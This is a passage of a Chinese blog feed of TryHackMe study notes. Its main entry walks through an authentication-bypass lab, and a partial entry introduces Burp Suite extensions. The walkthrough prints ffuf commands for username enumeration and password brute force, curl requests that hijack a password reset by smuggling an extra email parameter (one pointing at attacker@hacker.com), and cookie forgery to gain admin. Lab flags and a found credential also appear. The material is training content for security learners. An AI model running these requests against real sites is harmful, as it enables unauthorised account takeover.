<li><a class="link"   href="https://www.csoonline.com/article/3253899/the-best-new-windows-10-security-features.html" >CSO Online - The best new Windows 10 security features <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p><strong>注意：</strong></p>
<p>攻击者可以使用内置的 Windows 工具和实用程序来完成进一步的攻击操作，这种方式能够试图让攻击者在受害者环境中不被轻易发现；此策略被称为 Living Off The Land（LotL策略），你可以参阅以下链接以了解更多相关信息。</p>
<p>LOLBAS：<a class="link"   href="https://lolbas-project.github.io/" >https://lolbas-project.github.io/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
        <tag>BlueTeam</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Authentication Bypass(身份验证绕过)-学习</title>
    <url>/2024/01/27/THM-Authentication%20Bypass(%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/authenticationbypass" >https://tryhackme.com/room/authenticationbypass <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：了解如何破解登录和其他身份验证机制，以允许你访问未经许可的区域。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在本文中，我们将了解绕过、击溃或破坏网站身份验证方法的不同方式。 此类漏洞（会导致未授权访问）可能是最关键的漏洞之一，因为它通常以泄露客户个人数据而告终。</p>
<h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>在尝试查找身份验证漏洞时，一个有用的操作是创建一个有效用户名列表，我们稍后将在其他小节中使用它。</p>
<p>网站错误消息是整理这些信息以构建我们的有效用户名列表的重要资源。 在本文实验环境下（TryHackMe对应的实验房间）：我们访问Acme IT Support 网站 (<a class="link"   href="http://machine_ip/customers/signup" >http://MACHINE_IP/customers/signup <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 注册页面，能看到一个创建新用户帐户的表单。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111155341850.png"
                      alt="image-20221111155341850"
                ></p>
<p>如果你尝试输入用户名 <strong>admin</strong> 并使用虚假信息填写其他表单字段，你将看到一个错误提示“具有此用户名的帐户已存在–<strong>An account with this username already exists</strong>”。 我们可以使用下面的 ffuf 工具，利用此错误消息的存在来生成已在系统上注册的有效用户名列表。 ffuf 工具将使用常用的用户名列表来检查任何匹配项。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d <span class="string">&quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot;</span> -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u http://MACHINE_IP/customers/signup -mr <span class="string">&quot;username already exists&quot;</span></span></span><br></pre></td></tr></table></figure></div>

<p>在上面的示例中：</p>
<ul>
<li>-w 参数后接的是字典路径，在此示例中 具体指定的是攻击机上的用户名字典路径。 </li>
<li>-X 参数指定的是请求方法，默认为 GET 请求，但在此示例中为 POST 请求。</li>
<li>-d 参数指定我们要发送的数据，在此示例中，我们有四个字段：用户名、电子邮件、密码和 cpassword。 我们已将用户名的值设置为 FUZZ，在 ffuf 工具中，FUZZ 关键字表明我们所用的字典中的内容将被插入到请求消息中的什么位置。 </li>
<li>-H 参数用于向请求添加额外的标头，在示例中，我们将设置Content-Type 以便让web 服务器知道我们正在发送表单数据。 </li>
<li>-u 参数指定我们向其发出请求的 URL。</li>
<li>-mr 参数是我们正在寻找的页面上的报错信息的文本内容，以验证我们是否找到了有效的用户名。</li>
</ul>
<p>ffuf 工具和要使用的字典都预装在TryHackMe实验房间中的 AttackBox 上，你也可以通过 <a class="link"   href="https://github.com/ffuf/ffuf" >https://github.com/ffuf/ffuf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 下载并安装ffuf工具到你的本地攻击机。</p>
<p>请创建一个名为 valid_usernames.txt 的文件并在文件内容中 添加你使用 ffuf 工具找到的用户名，该文件将在第3小节中被使用。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111160125857.png"
                      alt="image-20221111160125857"
                ></p>
<p>目标站点网页：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111155548525.png"
                      alt="image-20221111155548525"
                ></p>
<p>注册报错信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111155611167.png"
                      alt="image-20221111155611167"
                ></p>
<p>使用fuff工具获取目标站点的注册网页的有效用户名：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.68.98/customers/signup -mr &quot;username already exists&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111160016064.png"
                      alt="image-20221111160016064"
                ></p>
<p>valid_usernames.txt的内容（使用命令<code>nano valid_usernames.txt</code>创建文本文件）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111162914591.png"
                      alt="image-20221111162914591"
                ></p>
<blockquote>
<p>admin、robert、simon、steve</p>
</blockquote>
<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>使用我们在上一个小节中生成的 valid_usernames.txt 文件，我们现在可以使用它来尝试对登录页面（<a class="link"   href="http://machine_ip/customers/login%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E6%94%BB%E5%87%BB%E3%80%82" >http://MACHINE_IP/customers/login）进行暴力攻击。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>注意：如果你使用ffuf 管道输出 来创建valid_usernames.txt 文件，那么该txt文件中的数据可能会出现问题。 请清理valid_usernames.txt文件中的数据，将有效用户名直接复制到txt文件中即可。</p>
<p>暴力破解攻击是一个自动化过程，它会尝试针对单个用户名或者多个用户名（如我们例子中的用户名列表）使用常用的密码字典去匹配。</p>
<p>运行此命令时，请确保终端命令行的执行位置与 valid_usernames.txt 文件位于同一目录中。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d <span class="string">&quot;username=W1&amp;password=W2&quot;</span> -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u http://MACHINE_IP/customers/login -<span class="built_in">fc</span> 200</span></span><br></pre></td></tr></table></figure></div>

<p>这个 ffuf 命令与第2小节中的命令有所不同：之前我们使用 <strong>FUZZ</strong> 关键字来选择 用户名字典在请求消息中插入数据的位置，而在本例中因为我们将使用多个字典列表，所以我们必须指定我们自己的关键字 <strong>W1</strong>和<strong>W2</strong>。 </p>
<p>在本例中，我们将使用 <code>-w</code> 参数指定多个字典列表，但是会用逗号分隔每个字典列表，我们将使用 <code>W1</code> 参数来指定有效用户名列表，使用 <code>W2</code> 参数来指定我们将要尝试的密码列表。最后，为了筛选出匹配成功的结果，我们将使用 <code>-fc</code> 参数来过滤HTTP 状态代码为200的消息响应结果（匹配成功会是302代码–重定向）。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111163501889.png"
                      alt="image-20221111163501889"
                ></p>
<p>使用ffuf工具：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.68.98/customers/login -fc 200</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111163214534.png"
                      alt="image-20221111163214534"
                ></p>
<blockquote>
<p>steve&#x2F;thunder</p>
</blockquote>
<h2 id="逻辑缺陷"><a href="#逻辑缺陷" class="headerlink" title="逻辑缺陷"></a>逻辑缺陷</h2><p><strong>什么是逻辑缺陷？</strong></p>
<p>有时 在身份验证过程中会存在逻辑缺陷问题。 逻辑缺陷是指应用程序的典型逻辑路径被攻击者绕过、规避或操纵。一个网站的任何区域都可能存在逻辑缺陷问题，但是我们将重点关注与本小节实例中的身份验证相关的示例。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111163947743.png"
                      alt="image-20221111163947743"
                ></p>
<p><strong>逻辑缺陷简单示例</strong></p>
<p>下面的模拟代码示例：检查客户端访问的路径的开头是否以 <code>/admin</code> 开头，如果是，则进一步检查客户端是否实际上是管理员用户；如果某个页面的访问路径不以<code>/admin</code>开头，则会将该页面直接显示给客户端。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( url.<span class="title function_ invoke__">substr</span>(<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;/admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment"># Code to check user is an admin</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># View Page</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为上面的 PHP 代码示例使用的是三个等号 (&#x3D;&#x3D;&#x3D;)，所以它会在字符串上寻找完全匹配，包括相同的大小写字母。 </p>
<p>以上代码示例 存在逻辑缺陷问题，如果未经身份验证的用户 请求的页面路径是以<code>/adMin</code>开头，按照代码逻辑将不会检查该用户的权限而是会将页面显示给该用户，所以导致该用户能够完全绕过身份验证检查。</p>
<p><strong>关于逻辑缺陷的知识点练习</strong></p>
<p>我们将检查 Acme IT Support 网站 (<a class="link"   href="http://machine_ip/customers/reset" >http://MACHINE_IP/customers/reset <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 的重置密码功能（ <strong>Reset Password</strong> ）。我们能够看到一个表格，要求提供与我们希望执行密码重置的帐户关联的电子邮件地址；如果输入了无效的电子邮件，你将收到一个错误消息“未能从提供的电子邮件地址找到帐户–<strong>Account not found from supplied email address</strong>”。</p>
<p>出于演示目的，我们将使用能被网站接受的电子邮件地址 <code>robert@acmeitsupport.thm</code>；然后我们会看到表单的下一阶段，它会要求我们输入与此登录电子邮件地址关联的用户名。 如果我们输入 <code>robert</code>作为用户名并点击<strong>检查用户名</strong>按钮，我们将看到一条确认消息，网站将向 <a class="link"   href="mailto:&#114;&#111;&#x62;&#101;&#x72;&#116;&#x40;&#97;&#99;&#109;&#x65;&#x69;&#x74;&#115;&#117;&#112;&#112;&#x6f;&#114;&#116;&#x2e;&#116;&#104;&#x6d;" >&#114;&#111;&#x62;&#101;&#x72;&#116;&#x40;&#97;&#99;&#109;&#x65;&#x69;&#x74;&#115;&#117;&#112;&#112;&#x6f;&#114;&#116;&#x2e;&#116;&#104;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 发送 关于密码重置的电子邮件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111165314913.png"
                      alt="image-20221111165314913"
                ></p>
<p>在这个阶段，你可能想知道这个web应用程序中的漏洞是什么：当你知道电子邮件和用户名之后，你就能够将密码重置链接发送到任意一个帐户所有者的电子邮件地址。</p>
<p>本演练需要在 AttackBox 上运行以下两个 Curl 请求。</p>
<p>在重置电子邮件过程的第二步中，用户名会通过 POST 字段提交到 Web 服务器，而电子邮件地址在查询字符串请求中会作为 GET 字段发送。</p>
<p>让我们通过使用 curl 工具手动向网络服务器发出请求来说明这一点。</p>
<p><em><strong>Curl Request 1</strong></em></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%40 是 @ 字符的url编码形式，可以使用url编码工具来验证</span></span><br><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl <span class="string">&#x27;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="string">&#x27;username=robert&#x27;</span></span></span><br></pre></td></tr></table></figure></div>

<p>我们使用<code>-H</code>标志向请求消息添加额外的标头。 在本例中，我们会将 <code>Content-Type</code> 设置为 <code>application/x-www-form-urlencoded</code>，这能让 Web 服务器知道我们正在发送表单数据，以便Web服务器能够正确理解我们的请求消息。</p>
<p>在以上示例的web应用程序中，网站将使用查询字符串来检索用户帐户，检索完成之后，根据应用程序的逻辑，该网站将使用 PHP 变量<code>$_REQUEST</code>中的数据来发送密码重置电子邮件。</p>
<p>该网站的PHP代码中的<code>$_REQUEST</code>变量是一个数组，其中包含了从查询字符串接收的数据和 POST 数据。 如果查询字符串和 POST 数据使用相同的键名，则此变量的应用程序逻辑将倾向于 POST 数据字段而不是查询字符串数据字段，因此如果我们在 POST 表单中添加另一个<code>email</code>参数，我们就可以控制 关于密码重置的电子邮件 的送达位置。</p>
<p><em><strong>Curl Request 2</strong></em></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl <span class="string">&#x27;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="string">&#x27;username=robert&amp;email=attacker@hacker.com&#x27;</span></span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111170742660.png"
                      alt="image-20221111170742660"
                ></p>
<p>接下来，我们需要在 Acme IT Support 的客户页面创建一个帐户，这样做会为我们提供一个唯一的电子邮件地址，可用于创建该网站提供的<em><strong>技术支持业务票据</strong></em>，电子邮件地址的格式为 <code>&#123;username&#125;@customer.acmeitsupport.thm</code>。</p>
<p>现在重新运行 <em><strong>Curl Request 2</strong></em>，但在电子邮件字段中使用我们自己的<code>@customer.acmeitsupport.thm</code>，然后在你的帐户上会生成一张业务票据，其中会包含一个链接，结果就是你能以 Robert 的身份实现登录并能查看Robert 用户的账户信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">user@tryhackme:~$ curl &#x27;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&amp;email=&#123;username&#125;@customer.acmeitsupport.thm&#x27;</span><br></pre></td></tr></table></figure></div>

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111181051000.png"
                      alt="image-20221111181051000"
                ></p>
<p>在目标站点的注册页注册一个账户：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111175641057.png"
                      alt="image-20221111175641057"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111174923668.png"
                      alt="image-20221111174923668"
                ></p>
<blockquote>
<p>hacker</p>
<p><a class="link"   href="mailto:&#x68;&#97;&#99;&#107;&#x65;&#114;&#64;&#x63;&#x75;&#x73;&#116;&#x6f;&#109;&#101;&#x72;&#46;&#97;&#99;&#x6d;&#x65;&#105;&#x74;&#115;&#117;&#112;&#112;&#111;&#114;&#116;&#x2e;&#x74;&#104;&#109;" >&#x68;&#97;&#99;&#107;&#x65;&#114;&#64;&#x63;&#x75;&#x73;&#116;&#x6f;&#109;&#101;&#x72;&#46;&#97;&#99;&#x6d;&#x65;&#105;&#x74;&#115;&#117;&#112;&#112;&#111;&#114;&#116;&#x2e;&#x74;&#104;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>在攻击机上使用curl命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">curl &#x27;http://10.10.68.98/customers/reset?email=robert@acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&amp;email=hacker@customer.acmeitsupport.thm&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111180303817.png"
                      alt="image-20221111180303817"
                ></p>
<p>在目标站点的hacker用户页面查看消息（点击id号查看详情）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111180434042.png"
                      alt="image-20221111180434042"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111180703383.png"
                      alt="image-20221111180703383"
                ></p>
<p>成功登录到用户robert：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111180918193.png"
                      alt="image-20221111180918193"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111181014808.png"
                      alt="image-20221111181014808"
                ></p>
<blockquote>
<p>THM{AUTH_BYPASS_COMPLETE}</p>
</blockquote>
<h2 id="Cookie篡改"><a href="#Cookie篡改" class="headerlink" title="Cookie篡改"></a>Cookie篡改</h2><p>在你的在线会话期间检查和编辑由 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、对其他用户帐户的访问或获得一个提升的权限。</p>
<p><strong>Cookie-Plain Text（明文）</strong></p>
<p>一些cookies的内容可以是纯文本的，它们的作用是显而易见的。 例如，假设以下是成功登录后所设置的cookie信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111183108914.png"
                      alt="image-20221111183108914"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: logged_in=true; Max-Age=3600; Path=/</span><br><span class="line">Set-Cookie: admin=false; Max-Age=3600; Path=/</span><br></pre></td></tr></table></figure></div>

<p>我们可以看到一个 cookie (logged_in)，它似乎控制着用户当前是否登录，还有另一个cookie (admin)，它控制着访问者是否具有管理员权限。 按照这个逻辑，如果我们更改了 cookie 的内容并重新发出请求，那么我们将能够更改我们拥有的权限。</p>
<p>首先，我们将从请求目标页面开始：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl http://10.10.68.98/cookie-test</span></span><br></pre></td></tr></table></figure></div>

<p>我们可以看到返回了一条消息：未登录–<strong>Not Logged In</strong></p>
<p>现在我们将发送另一个请求，并将<code>logged_in</code> cookie设置为<code>true</code>，将<code>admin</code> cookie设置为<code>false</code>：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl -H <span class="string">&quot;Cookie: logged_in=true; admin=false&quot;</span> http://10.10.68.98/cookie-test</span></span><br></pre></td></tr></table></figure></div>

<p>这次我们能够收到消息：以用户身份登录–<strong>Logged In As A User</strong></p>
<p>最后，我们将发送又一个请求，将 <code>logged_in</code> 和 <code>admin</code> cookie 都设置为<code>true</code>：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl -H <span class="string">&quot;Cookie: logged_in=true; admin=true&quot;</span> http://10.10.68.98/cookie-test</span></span><br></pre></td></tr></table></figure></div>

<p>这将返回结果：以管理员身份登录– <strong>Logged In As An Admin</strong></p>
<p><strong>Cookie-Hashing（散列）</strong></p>
<p>有时 cookie 值可能看起来像一长串随机字符，这些字符被称为散列，是原始文本内容的不可逆表示。 以下是你可能会遇到的一些hash示例：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111194755762.png"
                      alt="image-20221111194755762"
                ></p>
<p>从上表可以看出，输入同一字符串再经过hash算法处理而输出的hash值 可能会因使用的哈希算法不同而有显著不同的结果。 </p>
<p>即使哈希是不可逆的，但同一字符每次经同一hash算法处理之后都会产生相同的输出结果，这对我们破解hash值很有帮助，因为 <a class="link"   href="https://crackstation.net/" >https://crackstation.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 等在线网站存在一个保留了数十亿哈希值及其原始字符串的数据库。</p>
<p><strong>Cookie-Encoding（编码）</strong></p>
<p>编码类似于散列，因为它也会创建看似随机的文本字符串，但实际上，编码是可逆的。 这就引出了一个问题，编码有什么意义？ 编码允许我们将二进制数据转换为人类可读的文本，这些文本内容可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。</p>
<p>常见的编码类型有<code>base32</code>能将二进制数据转换为字符 A-Z 和 2-7，以及<code>base64</code>使用字符 a-z、A-Z、0-9、+、&#x2F; 和等号进行填充转换。</p>
<p>以web服务器登录时设置的以下数据为例：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/</span><br></pre></td></tr></table></figure></div>

<p>以上编码部分的数据经过<code>base64</code>解码之后的字符串的值为 <code>&#123;&quot;id&quot;:1,&quot;admin&quot;: false&#125;</code> ，我们可以将其重新编码回 <code>base64</code> 编码，但是我们将 <code>admin</code> 值设置为 <code>true</code>，然后我们就可以获得管理员访问权限。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111203851685.png"
                      alt="image-20221111203851685"
                ></p>
<p>发送一个请求，将 <code>logged_in</code> 和 <code>admin</code> cookie 都设置为<code>true</code>：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Cookie: logged_in=true; admin=true&quot; http://10.10.68.98/cookie-test</span><br></pre></td></tr></table></figure></div>

<p>返回结果：<strong>Logged In As An Admin</strong>以及 <strong>flag</strong> 内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111202637152.png"
                      alt="image-20221111202637152"
                ></p>
<blockquote>
<p>THM{COOKIE_TAMPERING}</p>
</blockquote>
<p>使用在线网站破解hash值：<a class="link"   href="https://crackstation.net/" >https://crackstation.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111203107286.png"
                      alt="image-20221111203107286"
                ></p>
<blockquote>
<p>结果：463729</p>
</blockquote>
<p>使用在线网站完成base64解码和编码：<a class="link"   href="https://www.base64decode.org/" >https://www.base64decode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111203412707.png"
                      alt="image-20221111203412707"
                ></p>
<blockquote>
<p>结果：THM{BASE64_ENCODING}</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111203816239.png"
                      alt="image-20221111203816239"
                ></p>
<blockquote>
<p>结果：eyJpZCI6MSwiYWRtaW4iOnRydWV9</p>
</blockquote>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Burp Suite：Extensions(Burp Suite扩展·更新版)-学习</title>
    <url>/2024/01/27/THM-Burp%20Suite%EF%BC%9AExtensions(Burp%20Suite%E6%89%A9%E5%B1%95%C2%B7%E6%9B%B4%E6%96%B0%E7%89%88)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/burpsuiteextensions" >https://tryhackme.com/room/burpsuiteextensions <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解如何使用Extensions模块来扩展Burp Suite的功能。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在本文中，我们将学习Burp Suite的Extensions(扩展)功能模块，该功能允许开发人员为Burp框架创建附加模块。</p>
<p>虽然在本文中并未深入探讨如何编写Burp模块，但是我们将在下文中简要地检查API文档，并讨论如何使用Burp Suite BApp Store来添加新的Burp模块。</p>
<h2 id="Extensions-主界面"><a href="#Extensions-主界面" class="headerlink" title="Extensions-主界面"></a>Extensions-主界面</h2><p>Burp Suite中的Extensions默认界面为我们提供了关于已经加载到Extensions模块中的Burp扩展的概述，让我们来看看这个默认主界面中的不同组件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104232728890.png"
                      alt="image-20240104232728890"
                ></p>
<ol>
<li>扩展列表：上图界面的顶部框体会显示Burp Suite为当前项目所安装的Burp扩展列表，该列表允许我们激活或停用单个Burp扩展。</li>
<li>管理扩展：在上图Extensions默认界面的左侧，会有一些用于管理Burp扩展的选项。<ul>
<li>Add：我们可以使用此按钮选择本地磁盘上的文件来安装新扩展，这些扩展可以是自定义编写的Burp扩展，也可以是从官方BApp商店中获取的Burp扩展，还可以是从互联网获取的第三方Burp扩展。</li>
<li>Remove：此按钮允许我们从Burp Suite中卸载所选定的Burp扩展。</li>
<li>Up&#x2F;Down：我们可以使用”Up&#x2F;Down”按钮来控制已安装的扩展在列表中的顺序，Burp扩展将基于扩展列表按降序调用，所有通过Burp的流量都将根据扩展列表自上而下地通过每个扩展，在我们调用与修改请求相关的Burp扩展时，这一点非常重要，因为有些Burp扩展可能会相互冲突或干扰。</li>
</ul>
</li>
<li>详细信息、输出和错误：在上图窗口的底部，会显示一些与当前所选定的Burp扩展相关的内容。<ul>
<li>Details(详细信息)：Details部分会提供关于所选定的Burp扩展的信息，例如Burp扩展的名称、版本和描述等。</li>
<li>Output(输出)：Burp扩展在执行过程中可能会产生一些输出，Output部分将显示所有与选定的Burp扩展相关的输出或结果。</li>
<li>Errors(错误)：如果选定的Burp扩展在执行过程中遇到任何错误，那么错误信息将显示在Errors部分中，这对于调试和排除Burp扩展相关问题非常有用。</li>
</ul>
</li>
</ol>
<p>总之，Burp Suite中的Extensions界面允许用户管理和监控已经安装的Burp扩展，并能为特定项目选择激活或停用某些Burp扩展，还能让用户查看与每个Burp扩展相关的重要详细信息、输出和错误提示。通过使用Extensions，Burp Suite能够成为一个强大且可定制的平台，以便用于各种安全测试和Web应用程序评估任务。</p>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>阅读本小节内容并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240105002720430.png"
                      alt="image-20240105002720430"
                ></p>
<h2 id="BApp-Store-Burp扩展商店"><a href="#BApp-Store-Burp扩展商店" class="headerlink" title="BApp Store(Burp扩展商店)"></a>BApp Store(Burp扩展商店)</h2><p>在Burp Suite中，Burp App Store(或简称BApp Store)将为我们列出官方的Burp扩展，并能允许我们将官方的Burp扩展与Burp Suite无缝集成；这些官方Burp扩展可以用多种语言编写，最常见的是使用Java或Python来编写Burp扩展，其中Java所编写的Burp扩展可以自动与Burp框架集成，而Python所编写的Burp扩展则需要配合Jython解释器才能在Burp框架中被使用。</p>
<p>为了更好地了解BApp商店，我们可以从安装Java所编写的Burp扩展开始。</p>
<p>我们可以切换到Extensions中的”BApp Store”子选项卡并搜索关键字”Request Timer”，然后我们就能找到名为”Request Timer”的Burp扩展，最后我们点击该扩展并选择”安装”即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240105185235030.png"
                      alt="image-20240105185235030"
                ></p>
<p><a class="link"   href="https://github.com/portswigger/request-timer" >Request Timer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>扩展是一个由Java语言编写的Burp扩展，它允许我们记录每个请求所对应的响应时间，这对于识别和利用基于时间的漏洞特别有用；例如，如果登录表单处理包含有效用户名的请求所需的响应时间要比处理包含无效用户名的请求所需的响应时间多一秒或几秒，那么我们就可以使用用户名单词列表来暴力攻击登录表单，并根据响应时间的差异来判断哪些用户名是有效的。</p>
<p>tips：请求计时器扩展在各种场景中都很有价值，特别是在评估Web应用程序的安全性以及识别潜在的基于时间的漏洞时。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
